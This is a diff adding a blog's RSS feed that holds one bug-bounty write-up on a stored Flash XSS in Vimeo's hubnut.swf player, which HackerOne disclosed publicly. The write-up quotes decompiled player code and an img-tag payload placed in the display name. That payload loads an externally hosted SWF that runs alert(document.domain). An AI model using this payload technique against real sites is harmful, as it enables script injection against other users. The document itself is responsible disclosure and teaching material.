@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Stefano</title>
+    <description>I share my findings here. Unless the ones that I think are useful for someone just starting finding bugs.
+</description>
+    <link>http://esevece.github.com/blog/</link>
+    <atom:link href="http://esevece.github.com/blog/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Mon, 30 Nov 2015 22:58:53 -0600</pubDate>
+    <lastBuildDate>Mon, 30 Nov 2015 22:58:53 -0600</lastBuildDate>
+    <generator>Jekyll v2.4.0</generator>
+    
+      <item>
+        <title>Flash XSS using images</title>
+        <description>&lt;p&gt;Looking for bugs on &lt;a href=&quot;https://hackerone.com/vimeo&quot;&gt;Vimeo&lt;/a&gt; I found out that they have an endpoint where they show the videos uploaded by an user using a Flash file. This is the endpoint for my user &lt;a href=&quot;https://vimeo.com/hubnut/user/user36690798&quot;&gt;https://vimeo.com/hubnut/user/user36690798&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;If you &lt;a href=&quot;view-source:https://vimeo.com/hubnut/user/user36690798&quot;&gt;look at the source&lt;/a&gt; you notice that there is a &lt;code&gt;var config&lt;/code&gt; which contains information about the user, including the name (which appears as the value of &lt;code&gt;display_name&lt;/code&gt;). This variable is loaded by the Flash file &lt;a href=&quot;https://f.vimeocdn.com/p/flash/hubnut/2.0.12/hubnut.swf&quot;&gt;https://f.vimeocdn.com/p/flash/hubnut/2.0.12/hubnut.swf&lt;/a&gt; who puts the value of &lt;code&gt;display_name&lt;/code&gt; in a &lt;code&gt;TextField()&lt;/code&gt; using the setter &lt;code&gt;.text&lt;/code&gt; and because they apply a style sheet to the &lt;code&gt;TextField()&lt;/code&gt;, the content &lt;a href=&quot;http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/text/TextField.html#text&quot;&gt;is interpreted as HTML&lt;/a&gt; like using &lt;code&gt;.htmlText&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;An extract of the code of the class &lt;em&gt;Carousel&lt;/em&gt; from the file &lt;em&gt;hubnut.swf&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;selectedLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;styleSheet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_loc2_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;// Here &amp;quot;display_name&amp;quot; appears as &amp;quot;_loc4_.owner.display_name&amp;quot;&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;_loc13_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_loc13_&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_loc4_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;h2&amp;gt;by &amp;lt;a href=\&amp;quot;//&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;vimeo_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_loc4_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;url_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;\&amp;quot; target=\&amp;quot;_blank\&amp;quot;&amp;gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_loc4_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;display_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;/a&amp;gt;&amp;lt;/h2&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;h2&amp;gt;by &amp;lt;strong&amp;gt;&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_loc4_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;owner&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;display_name&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;/strong&amp;gt;&amp;lt;/h2&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;selectedLabel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_loc13_&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, the value of &lt;code&gt;display_name&lt;/code&gt; is being encoded as HTML entities, but it was not the case 2 months ago (I think that they were escaping as JSON, for instance &lt;code&gt;/&lt;/code&gt; was being escaped as &lt;code&gt;\/&lt;/code&gt;). So, it was possible to put HTML code but Flash doesn’t interpret every HTML tag as valid. Which one is the widely used for this case? &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;, yes, but the problem is that you have a limit of 32 characters for your name in Vimeo and for me wasn’t enough to make a valid proof of concept. With this scenario I decided to read &lt;a href=&quot;http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/text/TextField.html#htmlText&quot;&gt;which HTML tags are interpreted by Flash&lt;/a&gt; and noticed this:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;src: Specifies the URL to an image or SWF file&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Sounds promising! Anyway, at first I thought that maybe Flash loaded the file in a sandbox to disallow execution of Javascript code but I continued the testing. I uploaded a Flash file to my server which executed &lt;code&gt;ExternalInterface.call(&quot;alert(document.domain)&quot;);&lt;/code&gt; and changed my name to &lt;code&gt;&amp;lt;img src=&quot;//u00f1.xyz/xss.swf&quot;&amp;gt;&lt;/code&gt;. Reloaded &lt;a href=&quot;https://vimeo.com/hubnut/user/user36690798&quot;&gt;https://vimeo.com/hubnut/user/user36690798&lt;/a&gt; and for my surprise &lt;code&gt;alert(document.domain)&lt;/code&gt; was executed on &lt;strong&gt;vimeo.com&lt;/strong&gt; without user interaction.&lt;/p&gt;
+
+&lt;p&gt;After successfully execute Javascript using an &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag, I went to check if it was possible to do the same but in cases where you can provide the URL of an image that is shown using Flash, and I confirmed that it is possible. What I mean is that if, for example, Vimeo allowed to put any URL as the thumbnail of the video, you could provide an URL to a Flash file of yours with Javascript code and it would probably load the file and execute the Javascript code.&lt;/p&gt;
+
+&lt;p&gt;You can test the issue using the &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag &lt;a href=&quot;http://esevece.github.io/code/XssImage.html?file=https%3A%2f%2fgithub.com%2fesevece%2fesevece.github.io%2fblob%2fmaster%2fcode%2fxss.swf%3Fraw%3Dtrue&amp;amp;asHtml=true&amp;amp;asObject=false&quot;&gt;here&lt;/a&gt; and the issue when you can provide the URL of an image &lt;a href=&quot;http://esevece.github.io/code/XssImage.html?file=https%3A%2f%2fgithub.com%2fesevece%2fesevece.github.io%2fblob%2fmaster%2fcode%2fxss.swf%3Fraw%3Dtrue&amp;amp;asHtml=false&amp;amp;asObject=false&quot;&gt;here&lt;/a&gt;.
+This code is available at &lt;a href=&quot;https://github.com/esevece/esevece.github.io/code/&quot;&gt;https://github.com/esevece/esevece.github.io/code/&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;The report &lt;a href=&quot;https://hackerone.com/reports/87577&quot;&gt;is publicly disclosed on HackerOne&lt;/a&gt; thanks to Vimeo.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 01 Dec 2015 00:00:00 -0600</pubDate>
+        <link>http://esevece.github.com/blog/2015/12/01/flash-xss-using-images.html</link>
+        <guid isPermaLink="true">http://esevece.github.com/blog/2015/12/01/flash-xss-using-images.html</guid>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
